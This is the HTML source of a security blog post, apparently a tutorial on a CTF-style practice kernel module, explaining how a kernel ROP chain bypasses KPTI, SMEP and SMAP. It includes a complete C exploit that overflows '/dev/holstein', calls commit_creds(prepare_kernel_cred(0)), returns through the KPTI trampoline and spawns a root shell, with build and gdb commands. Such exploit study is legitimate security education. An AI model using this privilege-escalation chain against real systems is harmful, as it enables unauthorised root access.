@@ -1,0 +1,190 @@
+<!doctype html>
+<html lang="en" data-theme="light"><head>
+  <meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>[KERNEL] KROP_(KPTI bypass) · whrds.log</title><meta name="description" content="※ If there are any mistakes, please let us know. We will check and correct it. ※This time, we will cover KROP, which bypasses the KPTI protection technique along with SMEP and SMAP. #!/bin/shqemu-system-x86_64 \ -m 64M \ -nographic \ -kernel bzImage \ -append &quot;console=ttyS">
+  <meta name="theme-color" content="#f7f7f3"><link rel="canonical" href="https://whrds.github.io/en/posts/kernel-krop-kpti-bypass/">
+  <link rel="alternate" hreflang="en" href="https://whrds.github.io/en/posts/kernel-krop-kpti-bypass/"><link rel="alternate" hreflang="ko" href="https://whrds.github.io/ko/posts/kernel-krop-kpti-bypass/">
+  <meta property="og:type" content="article"><meta property="og:title" content="[KERNEL] KROP_(KPTI bypass) · whrds.log"><meta property="og:description" content="※ If there are any mistakes, please let us know. We will check and correct it. ※This time, we will cover KROP, which bypasses the KPTI protection technique along with SMEP and SMAP. #!/bin/shqemu-system-x86_64 \ -m 64M \ -nographic \ -kernel bzImage \ -append &quot;console=ttyS"><meta property="og:url" content="https://whrds.github.io/en/posts/kernel-krop-kpti-bypass/">
+  <link rel="icon" href="/assets/favicon.svg" type="image/svg+xml"><link rel="stylesheet" href="/assets/styles.css">
+  <script>try{const t=localStorage.getItem('theme');if(t)document.documentElement.dataset.theme=t;else if(matchMedia('(prefers-color-scheme:dark)').matches)document.documentElement.dataset.theme='dark'}catch(e){}</script>
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","headline":"[KERNEL] KROP_(KPTI bypass)","description":"※ If there are any mistakes, please let us know. We will check and correct it. ※This time, we will cover KROP, which bypasses the KPTI protection technique along with SMEP and SMAP. #!/bin/shqemu-system-x86_64 \\ -m 64M \\ -nographic \\ -kernel bzImage \\ -append \"console=ttyS","datePublished":"2024-06-28","inLanguage":"en","url":"https://whrds.github.io/en/posts/kernel-krop-kpti-bypass/","author":{"@type":"Person","name":"whrds"}}</script>
+</head><body>
+  <a class="skip-link" href="#main">Skip to content</a>
+  <header class="site-header"><div class="shell header-inner">
+    <a class="brand" href="/en/" aria-label="whrds.log home"><span class="brand-mark">W_</span><span class="brand-text">whrds.log</span></a>
+    <nav class="main-nav" aria-label="Main navigation">
+      <a href="/en/" aria-current="page">Notes</a>
+      <a href="/en/about/">About</a>
+    </nav>
+    <div class="header-tools">
+      <div class="language-switch" aria-label="Language">
+        <a href="/ko/posts/kernel-krop-kpti-bypass/" class="" lang="ko">KO</a>
+        <a href="#" class="active" lang="en" aria-current="true">EN</a>
+      </div>
+      <button class="icon-button" type="button" data-theme-toggle aria-label="Use dark theme">◐</button>
+    </div>
+  </div></header>
+  <main id="main"><article class="article-wrap"><header class="article-header"><p class="eyebrow">Security research notes</p><h1>[KERNEL] KROP_(KPTI bypass)</h1><p class="article-description">※ If there are any mistakes, please let us know. We will check and correct it. ※This time, we will cover KROP, which bypasses the KPTI protection technique along with SMEP and SMAP. #!/bin/shqemu-system-x86_64 \ -m 64M \ -nographic \ -kernel bzImage \ -append &quot;console=ttyS</p><div class="article-meta"><time datetime="2024-06-28">Jun 28, 2024</time><span>·</span><span>2 min read</span></div></header><div class="prose"><p><strong>※ If there are any mistakes, please let me know. We will check and correct it. <strong>※</strong></strong></p>
+<p>This time, we will cover KROP, which bypasses the KPTI protection technique along with SMEP and SMAP.</p>
+<pre><code>#!/bin/sh
+qemu-system-x86_64 \
+    -m 64M \
+    -nographic \
+    -kernel bzImage \
+    -append &quot;console=ttyS0 loglevel=3 oops=panic panic=-1 nopti nokaslr pti=on&quot; \
+    -no-reboot \
+    -cpu qemu64,+smep,+smap \
+    -smp 1 \
+    -monitor /dev/null \
+    -initrd debugfs.cpio \
+    -net nic,model=virtio \
+    -net user \
+    -gdb tcp::12345
+</code></pre>
+<p>Modify <a href="http://run.sh">run.sh</a> as above.</p>
+<p>+smep : Enable smep</p>
+<p>+smap : Activate smap</p>
+<p>-append “… pti=on …” : Activate kpti</p>
+<p><img src="/assets/images/tistory/tistory-1988ea5328ae/001.png" alt=""></p>
+<p>When I ran the KROP binary I created previously, a Segment fault was displayed.</p>
+<p><a href="https://whrdud727.tistory.com/entry/KERNEL-KROPSMEP-bypass">https://whrdud727.tistory.com/entry/KERNEL-KROPSMEP-bypass</a></p>
+<p> [[KERNEL] KROP_(SMEP bypass)</p>
+<p>※ If there are any mistakes, please let me know. We will check and correct it. ※ In the user area, ROP was used to bypass the NX-BIT protection technique. ROP in the kernel area also uses a protection technique called SMEP.</p>
+<p><a href="http://whrdud727.tistory.com">whrdud727.tistory.com</a>](<a href="https://whrdud727.tistory.com/entry/KERNEL-KROPSMEP-bypass">https://whrdud727.tistory.com/entry/KERNEL-KROPSMEP-bypass</a>)</p>
+<p>To bypass this, the CR3 register must be modulated.</p>
+<p>CR3 register: This is a register referenced when returning to the user area after processing a task in the kernel area.</p>
+<p>This is used to differentiate the accessible memory area in the user area from the accessible memory area in the kernel area. There is a representative macro related to this.</p>
+<pre><code>swapgs_restore_regs_and_return_to_usermode
+</code></pre>
+<pre><code>	POP_REGS pop_rdi=0
+
+	/*
+	 * The stack is now user RDI, orig_ax, RIP, CS, EFLAGS, RSP, SS.
+	 * Save old stack pointer and switch to trampoline stack.
+	 */
+	movq	%rsp, %rdi
+	movq	PER_CPU_VAR(cpu_tss_rw + TSS_sp0), %rsp
+	UNWIND_HINT_EMPTY
+
+	/* Copy the IRET frame to the trampoline stack. */
+	pushq	6*8(%rdi)	/* SS */
+	pushq	5*8(%rdi)	/* RSP */
+	pushq	4*8(%rdi)	/* EFLAGS */
+	pushq	3*8(%rdi)	/* CS */
+	pushq	2*8(%rdi)	/* RIP */
+
+	/* Push user RDI on the trampoline stack. */
+	pushq	(%rdi)
+
+	/*
+	 * We are on the trampoline stack.  All regs except RDI are live.
+	 * We can do future final exit work right here.
+	 */
+	STACKLEAK_ERASE_NOCLOBBER
+
+	SWITCH_TO_USER_CR3_STACK scratch_reg=%rdi
+
+	/* Restore RDI. */
+	popq	%rdi
+	SWAPGS
+	INTERRUPT_RETURN
+</code></pre>
+<p>The part to be careful about in this code is [SWITCH_TO_USER_CR3_STACK scratch_reg=%rdi].</p>
+<p><img src="/assets/images/tistory/tistory-1988ea5328ae/002.png" alt=""></p>
+<p>Check the location of the macro for debugging.</p>
+<pre><code>gdb
+gef-remote localhost 12345
+x/32gi 0xffffffff81800e10
+</code></pre>
+<p><img src="/assets/images/tistory/tistory-1988ea5328ae/003.png" alt=""></p>
+<p><img src="/assets/images/tistory/tistory-1988ea5328ae/004.png" alt=""></p>
+<p><img src="/assets/images/tistory/tistory-1988ea5328ae/005.png" alt=""></p>
+<p>This is the part where the CR3 register is manipulated. If the CR3 register is manipulated, it becomes impossible to retrieve and restore data from the stack in the kernel after iretq. </p>
+<p><img src="/assets/images/tistory/tistory-1988ea5328ae/006.png" alt=""></p>
+<p>Looking at the code a little further, there is some work to build a stack frame before manipulating CR3.</p>
+<p>→ Afterwards, pop rax at 0xffffffff81800e7f; pop rdi; carry out</p>
+<p>→ swapgs at 0xffffffff81800eb0; iretq; carry out</p>
+<p>→ rip, cs, rflags, rsp, ss can be set</p>
+<p>If you take the above addresses and write the exploit code, it is as follows.</p>
+<pre><code>#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;unistd.h&gt;
+
+unsigned long user_cs, user_ss, user_rsp, user_rflags;
+unsigned long prepare_kernel_cred = 0xffffffff8106e240;
+unsigned long commit_creds = 0xffffffff8106e390;
+#define prdi  0xffffffff8127bbdc
+#define prsi  0xffffffff8101ccde
+#define prdx  0xffffffff81146092
+#define prcx  0xffffffff812ea083
+#define mrdi  0xffffffff8160c96b
+#define swapgs  0xffffffff8160bf7e
+#define iretq  0xffffffff810202af
+#define rtu 0xffffffff81800e26
+
+static void win() {
+        char *argv[] = { &quot;/bin/sh&quot;, NULL };
+        char *evnp[] = { NULL };
+        puts(&quot;[+] win!&quot;);
+        execve(&quot;/bin/sh&quot;, argv, evnp);
+}
+
+static void save_state() {
+        asm(
+            &quot;movq %%cs, %0\n&quot;
+            &quot;movq %%ss, %1\n&quot;
+            &quot;movq %%rsp, %2\n&quot;
+            &quot;pushfq\n&quot;
+            &quot;popq %3\n&quot;
+            : &quot;=r&quot;(user_cs), &quot;=r&quot;(user_ss), &quot;=r&quot;(user_rsp), &quot;=r&quot;(user_rflags
+)
+	  :
+      : &quot;memory&quot;);
+}
+
+int main() {
+    save_state();
+    int fd = open(&quot;/dev/holstein&quot;, 2);
+
+    char buf[0x500];
+    memset(buf, 'A', 0x408);
+    
+    //commit_cred(prepare_kernel_cred(NULL)) 구현하기
+    unsigned long *payload = (unsigned long*)&amp;buf[0x408];
+    *payload++ = prdi;
+    *payload++ = 0;
+    *payload++ = prepare_kernel_cred;
+    *payload++ = prcx;
+    *payload++ = 0; //rep 명령어 때문에 추가한 부분 -&gt; rcx를 0으로 두어 반복을 안하기 위함
+    *payload++ = mrdi;
+    *payload++ = commit_creds;
+    *payload++ = rtu;
+    *payload++ = 0xdeadbeef;
+    *payload++ = 0xdeadbeef;
+    *payload++ = (unsigned long*)&amp;win;
+    *payload++ = user_cs;
+    *payload++ = user_rflags;
+    *payload++ = user_rsp;
+    *payload++ = user_ss;
+    
+    write(fd,buf, (void*)payload - (void*)buf);
+
+    close(fd);
+    return 0;
+}
+</code></pre>
+<pre><code>gcc kpti.c -o kpti --static
+cp kpti ./root/
+cd root
+find . -print0 | cpio -o --null --format=newc --owner=root &gt; ../debugfs.cpio
+cd ..
+sh run.sh
+</code></pre>
+<p><img src="/assets/images/tistory/tistory-1988ea5328ae/007.png" alt=""></p>
+<p>This time, you can see that privilege elevation was successful.</p>
+</div><div class="article-end"><a href="/en/">← View all notes</a><a href="/ko/posts/kernel-krop-kpti-bypass/" hreflang="ko">Read this post in Korean →</a></div></article></main>
+  <footer class="site-footer"><div class="shell footer-inner"><span>© 2026 whrds</span><span>Observe, verify, document.</span><a href="/en/feed.xml">RSS</a></div></footer>
+  <script src="/assets/app.js" defer></script>
+</body></html>
